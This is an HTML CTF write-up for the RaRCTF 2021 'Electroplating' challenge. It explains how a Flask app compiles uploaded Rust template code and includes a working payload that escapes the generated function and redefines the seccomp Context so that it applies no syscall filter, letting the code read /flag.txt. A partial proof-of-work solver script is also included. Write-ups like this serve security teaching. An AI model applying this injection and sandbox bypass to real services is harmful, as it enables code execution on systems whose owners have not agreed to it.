@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <meta name="generator" content="Pelican" />
+        <title>Electroplating</title>
+        <link rel="stylesheet" href="https://moormaster.github.io/CtfWriteups/theme/css/main.css" />
+        <link href="https://moormaster.github.io/CtfWriteups/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="CTF writeups Atom Feed" />
+        <meta name="description" content="We are given a docker container that presents us a gunicorn web-app. Just as in the Fancy Button Generator challenge we are asked to verify our..." />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="https://moormaster.github.io/CtfWriteups/">CTF writeups</a></h1>
+                <nav><ul>
+                    <li><a href="https://moormaster.github.io/CtfWriteups/category/ctfs.html">CTFs</a></li>
+                    <li class="active"><a href="https://moormaster.github.io/CtfWriteups/category/rarctf-2021-capture-the-flag.html">RaRCTF 2021 Capture The Flag</a></li>
+                    <li><a href="https://moormaster.github.io/CtfWriteups/category/really-awesome-ctf-2021.html">Really Awesome CTF 2021</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="https://moormaster.github.io/CtfWriteups/electroplating.html" rel="bookmark"
+           title="Permalink to Electroplating">Electroplating</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <abbr class="published" title="2021-08-09T00:00:00+02:00">
+                Published: Mo 09 August 2021
+        </abbr>
+
+        <address class="vcard author">
+                By                         <a class="url fn" href="https://moormaster.github.io/CtfWriteups/author/moormastergmxnet.html">moormaster@gmx.net</a>
+        </address>
+<p>In <a href="https://moormaster.github.io/CtfWriteups/category/rarctf-2021-capture-the-flag.html">RaRCTF 2021 Capture The Flag</a>.</p>
+
+</footer><!-- /.post-info -->      <p>We are given a docker container that presents us a gunicorn web-app. Just as in the Fancy Button Generator challenge we are asked to verify our session using the api-endpoint at location /pow. By looking at the app.py we can see that this time the difficulty was increased to 6:</p>
+<div class="highlight"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/pow&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">do_pow</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+        <span class="o">...</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="kn">import</span> <span class="nn">pow</span>
+        <span class="n">difficulty</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;DIFFICULTY&quot;</span><span class="p">,</span> <span class="s2">&quot;6&quot;</span><span class="p">))</span>
+        <span class="n">pref</span><span class="p">,</span> <span class="n">suff</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;pref&#39;</span><span class="p">],</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;suff&#39;</span><span class="p">]</span>
+        <span class="n">answer</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;answer&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">pow</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">pref</span><span class="p">,</span> <span class="n">suff</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="n">difficulty</span><span class="p">):</span>
+            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;verified&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
+            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;end&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">30</span>
+            <span class="k">return</span> <span class="s2">&quot;Thank you!&quot;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;POW incorrect&quot;</span>
+</code></pre></div>
+
+<p>For experimenting with the docker container it is a good idea to lower the difficulty when testing locally. By further looking at the source code of the Docker image we find a skeleton directory for a web application written in rust as well as an flask based python web application. In the app.py we find out about what the / endpoint does</p>
+<div class="highlight"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">upload_file</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;verified&#39;</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s2">&quot;Please complete &lt;pre&gt;/pow&lt;/pre&gt;&quot;</span><span class="p">,</span> <span class="mi">403</span>
+
+    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s1">&#39;/app&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+            <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;uploads&#39;</span><span class="p">,</span> <span class="n">secure_filename</span><span class="p">(</span><span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="p">))</span>
+            <span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">get_result</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
+        <span class="k">del</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;verified&#39;</span><span class="p">]</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">=</span><span class="n">response</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>After the session was verified we are presented with a file upload widget in the browser. The challenge also provides an example file template.htmlrs which will be accepted by the uploader:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;</span><span class="nt">templ</span><span class="p">&gt;</span>&quot;Page Title&quot;.to_string()<span class="p">&lt;/</span><span class="nt">templ</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">templ</span><span class="p">&gt;</span>&quot;bruh&quot;.to_string()<span class="p">&lt;/</span><span class="nt">templ</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>The template file seems to contain rust code inside of each &lt;templ&gt; tag. But how does the python app manage to interprete these expressions correctly? The magic happens within the get_result() function found in the app.py. We find two variables containing a code template for a web-application written in rust and the other containing a code template for a rust methods. </p>
+<div class="highlight"><pre><span></span><code><span class="n">rust_template</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">#![allow(warnings, unused)]</span>
+<span class="s2">use std::collections::HashMap;</span>
+<span class="s2">use std::fs;</span>
+<span class="s2">use std::env;</span>
+<span class="s2">extern crate seccomp;</span>
+<span class="s2">extern crate libc;</span>
+
+<span class="s2">extern crate tiny_http;</span>
+<span class="s2">extern crate seccomp_sys;</span>
+<span class="s2">use seccomp::*;</span>
+
+<span class="s2">use tiny_http::{Server, Response, Header, Request};</span>
+
+<span class="s2">static ALLOWED: &amp;&#39;static [usize] = &amp;[0, 1, 3, 11, 44,</span>
+<span class="s2">                                     60, 89, 131, 202,</span>
+<span class="s2">                                     231, 318];</span>
+
+<span class="s2">fn main() {</span>
+<span class="s2">    let mut dir = env::current_exe().unwrap();</span>
+<span class="s2">    dir.pop();</span>
+<span class="s2">    dir.push(&quot;../../app.htmlrs&quot;);</span>
+<span class="s2">    let template = fs::read_to_string(dir.to_str().unwrap()).unwrap();</span>
+<span class="s2">    let server = Server::http(&quot;127.0.0.1:</span><span class="si">%s</span><span class="s2">&quot;).unwrap();</span>
+<span class="s2">    apply_seccomp();</span>
+<span class="s2">    for request in server.incoming_requests() {</span>
+<span class="s2">        println!(&quot;received request! method: {:?}, url: {:?}&quot;,</span>
+<span class="s2">            request.method(),</span>
+<span class="s2">            request.url(),</span>
+<span class="s2">        );</span>
+<span class="s2">        handle_request(request, &amp;template);</span>
+<span class="s2">        std::process::exit(0);</span>
+<span class="s2">    }</span>
+<span class="s2">}</span>
+
+<span class="s2">fn handle_request(req: Request, template: &amp;String) {</span>
+<span class="s2">    let mut methods: HashMap&lt;_, fn() -&gt; String&gt; = HashMap::new();</span>
+<span class="s2">    </span><span class="si">%s</span><span class="s2"></span>
+<span class="s2">    let mut html = template.clone();</span>
+<span class="s2">    for (name, fun) in methods.iter() {</span>
+<span class="s2">        html = html.replace(name, &amp;fun());</span>
+<span class="s2">    }</span>
+<span class="s2">    let header = Header::from_bytes(</span>
+<span class="s2">        &amp;b&quot;Content-Type&quot;[..], &amp;b&quot;text/html&quot;[..]</span>
+<span class="s2">    ).unwrap();</span>
+<span class="s2">    let mut response = Response::from_string(html);</span>
+<span class="s2">    response.add_header(header);</span>
+<span class="s2">    req.respond(response).unwrap();</span>
+<span class="s2">}</span>
+
+<span class="s2">fn apply_seccomp() {</span>
+<span class="s2">    let mut ctx = Context::default(Action::KillProcess).unwrap();</span>
+<span class="s2">    for i in ALLOWED {</span>
+<span class="s2">        let rule = Rule::new(*i, None, Action::Allow);</span>
+<span class="s2">        ctx.add_rule(rule).unwrap();</span>
+<span class="s2">    }</span>
+<span class="s2">    ctx.load();</span>
+<span class="s2">}</span>
+<span class="si">%s</span><span class="s2"></span>
+<span class="s2">&quot;&quot;&quot;</span>
+
+<span class="n">templ_fun</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">fn temp</span><span class="si">%s</span><span class="s2">() -&gt; String {</span>
+<span class="s2">    </span><span class="si">%s</span><span class="s2"></span>
+<span class="s2">}</span>
+<span class="s2">&quot;&quot;&quot;</span>
+</code></pre></div>
+
+<p>The get_result() function creates a copy of the skeleton directory containing the rust web-application. It uses the function template variable to create a rust method for each &lt;templ&gt; tag found in the uploaded file and puts the contents of each tags into the function body. The new rust methods are then injected into the rust code template found in the rust_template variable. The final result is written into an appp.htmlrs file inside of the copied skeleton directory before it gets executed in a separate process. After that the python part tries to reach the rust web-api endpoint to receive the rendered html contents.</p>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">get_result</span><span class="p">(</span><span class="n">template_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">template_path</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">templ</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">TemporaryDirectory</span><span class="p">()</span> <span class="k">as</span> <span class="n">tmpdir</span><span class="p">:</span>
+    <span class="n">shutil</span><span class="o">.</span><span class="n">copytree</span><span class="p">(</span><span class="s1">&#39;skeleton&#39;</span><span class="p">,</span> <span class="n">tmpdir</span><span class="p">,</span> <span class="n">dirs_exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">)</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randrange</span><span class="p">(</span><span class="mi">40000</span><span class="p">,</span> <span class="mi">50000</span><span class="p">))</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;src/main.rs&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">templ</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+        <span class="n">funcs</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">temp</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;templ&#39;</span><span class="p">)):</span>
+            <span class="n">funcs</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">templ_fun</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">temp</span><span class="o">.</span><span class="n">text</span><span class="p">))</span>
+            <span class="n">templ</span> <span class="o">=</span> <span class="n">templ</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&lt;templ&gt;</span><span class="si">{</span><span class="n">temp</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s1">&lt;/templ&gt;&#39;</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;temp</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="n">hashmap</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">funcs</span><span class="p">)):</span>
+            <span class="n">hashmap</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;methods.insert(&quot;temp</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&quot;, temp</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">);</span><span class="se">\n</span><span class="s2">&quot;&quot;&quot;</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rust_template</span> <span class="o">%</span> <span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">hashmap</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">funcs</span><span class="p">)))</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;app.htmlrs&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">templ</span><span class="p">)</span>
+
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cargo run --offline --verbose &amp;&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;http://localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="s1">&#39;/app&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">traceback</span><span class="o">.</span><span class="n">format_exc</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="s2">&quot;App failed to start&quot;</span>
+</code></pre></div>
+
+<p>The challenge here seems to be easy at first as we just need to place the correct rust code inside of one of the &lt;templ&gt; tags in the uploaded file to open and read the flag.txt file:</p>
+<div class="highlight"><pre><span></span><code>html:::
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;title&gt;&lt;templ&gt;</span>fs::read_to_string(&quot;/flag.txt&quot;).unwrap()<span class="nt">&lt;/templ&gt;&lt;/title&gt;</span>
+<span class="nt">&lt;h1&gt;&lt;templ&gt;</span>&quot;bruh&quot;.to_string()<span class="nt">&lt;/templ&gt;&lt;/h1&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>
+
+<p>However this attempt fails because the rust application uses the seccomp library to limit the system calls that are allowed to do:</p>
+<div class="highlight"><pre><span></span><code><span class="nl">rust</span><span class="p">:</span><span class="o">::</span><span class="w"></span>
+<span class="k">use</span><span class="w"> </span><span class="nl">seccomp</span><span class="p">:</span><span class="err">:</span><span class="o">*</span><span class="p">;</span><span class="w"></span>
+
+<span class="p">...</span><span class="w"></span>
+
+<span class="k">static</span><span class="w"> </span><span class="nl">ALLOWED</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="err">&#39;</span><span class="k">static</span><span class="w"> </span><span class="o">[</span><span class="n">usize</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;[</span><span class="n">0, 1, 3, 11, 44,</span>
+<span class="n">                                     60, 89, 131, 202,</span>
+<span class="n">                                     231, 318</span><span class="o">]</span><span class="p">;</span><span class="w"></span>
+
+<span class="p">...</span><span class="w"></span>
+
+<span class="n">fn</span><span class="w"> </span><span class="n">apply_seccomp</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">let</span><span class="w"> </span><span class="n">mut</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nl">Context</span><span class="p">:</span><span class="err">:</span><span class="k">default</span><span class="p">(</span><span class="k">Action</span><span class="o">::</span><span class="n">KillProcess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">ALLOWED</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">let</span><span class="w"> </span><span class="k">rule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">Rule</span><span class="o">::</span><span class="k">new</span><span class="p">(</span><span class="o">*</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="k">None</span><span class="p">,</span><span class="w"> </span><span class="k">Action</span><span class="o">::</span><span class="n">Allow</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="n">add_rule</span><span class="p">(</span><span class="k">rule</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="err">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">ctx</span><span class="p">.</span><span class="k">load</span><span class="p">();</span><span class="w"></span>
+<span class="err">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>By looking at the beginning of the rust_template variable we can see that the seccomp namespace is not imported but only its contents. This gives us the chance to create the same classes as provided by the lib.rs but with manipulated behaviour. By injecting our own manipulated "Context" class into the uploaded file we can prevent the rust application from applying the seccomp rules into the kernel:</p>
+<div class="highlight"><pre><span></span><code>html:::
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;title&gt;&lt;templ&gt;</span>fs::read_to_string(&quot;/flag.txt&quot;).unwrap()<span class="nt">&lt;/templ&gt;&lt;/title&gt;</span>
+<span class="nt">&lt;h1&gt;&lt;templ&gt;</span>
+  &quot;anything&quot;.to_string()
+  // / 1) escape from temp1() method definition by putting a } here
+}
+
+// / 2) seccomp reimplementation - copied from lib.rs and manipulated to allow everything
+// /    this works because the seccomp::Context object is imported with * and instanciated without
+// /    using its original namespace seccomp::
+
+// / <span class="cp">&lt;![CDATA[</span>
+<span class="cp">// /    Note: the CDATA section enables us to use &quot;&lt;&quot; and &quot;&gt;&quot; (prevents the html parser from recognizing tags in here)</span>
+<span class="cp">use seccomp_sys::scmp_compare::*;</span>
+<span class="cp">use seccomp_sys::*;</span>
+
+<span class="cp">#[derive(Debug)]</span>
+<span class="cp">pub struct SeccompError {</span>
+<span class="cp">    msg: String,</span>
+<span class="cp">}</span>
+
+<span class="cp">impl SeccompError {</span>
+<span class="cp">    fn new&lt;T: Into&lt;String&gt;&gt;(msg: T) -&gt; Self {</span>
+<span class="cp">        SeccompError { msg: msg.into() }</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+
+<span class="cp">#[derive(Debug)]</span>
+<span class="cp">pub struct Context {</span>
+<span class="cp">    int: *mut scmp_filter_ctx,</span>
+<span class="cp">}</span>
+
+<span class="cp">impl Context {</span>
+<span class="cp">    /// Creates new context with default action</span>
+<span class="cp">    pub fn default(def_action: Action) -&gt; Result&lt;Context, SeccompError&gt; {</span>
+<span class="cp">        let filter_ctx = unsafe { seccomp_init(Action::Allow.into()) };</span>
+<span class="cp">        if filter_ctx.is_null() {</span>
+<span class="cp">            return Err(SeccompError::new(&quot;initialization failed&quot;));</span>
+<span class="cp">        }</span>
+<span class="cp">        Ok(Context { int: filter_ctx })</span>
+<span class="cp">    }</span>
+
+<span class="cp">    /// Adds rule to the context</span>
+<span class="cp">    pub fn add_rule(&amp;mut self, rule: Rule) -&gt; Result&lt;(), SeccompError&gt; {</span>
+<span class="cp">        Ok(())</span>
+<span class="cp">    }</span>
+
+<span class="cp">    /// Loads the filter into the kernel. Rules will be applied when this function returns.</span>
+<span class="cp">    pub fn load(&amp;self) -&gt; Result&lt;(), SeccompError&gt; {</span>
+<span class="cp">        Ok(())</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+<span class="cp">// / ]]&gt;</span>
+
+// / 3) defining another method to have valid syntax - the } will be added by the app.py
+fn anyMethod() -&gt; String {
+  &quot;hello&quot;.to_string()
+<span class="nt">&lt;/templ&gt;&lt;/h1&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div>
+
+<p>Now all we need to do is upload this file and the flag will be presented to us as replacement for the first &lt;templ&gt; tag.</p>
+<p>The Fancy Button Generator challenge already gave us the template-solve.py file which automates session verification and file uploading for us. A slight modification allows us to use it for both - local testing and solving the remote challenge:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">uuid</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">generate</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[:</span><span class="mi">4</span><span class="p">],</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">verify</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="n">difficulty</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
+    <span class="nb">hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">prefix</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">answer</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">suffix</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">return</span> <span class="nb">hash</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="o">*</span><span class="n">difficulty</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="n">difficulty</span><span class="p">):</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">test</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">verify</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="n">test</span><span class="p">,</span> <span class="n">difficulty</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">test</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Hint: usage [url] [difficulty]&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Example: &quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; [url] [difficulty]&quot;</span><span class="p">)</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="n">difficulty</span> <span class="o">=</span> <span class="kc">None</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span>
+    <span class="n">difficulty</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+
+<span class="k">if</span> <span class="n">host</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">host</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
+    <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;https://electroplating.rars.win&quot;</span>
+<span class="k">if</span> <span class="n">difficulty</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">difficulty</span> <span class="o">=</span> <span class="mi">6</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="s2">&quot;/pow&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Solving POW&quot;</span><span class="p">)</span>
+<span class="n">solution</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;pref&#39;</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;suff&#39;</span><span class="p">],</span> <span class="n">difficulty</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Solved: </span><span class="si">{</span><span class="n">solution</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
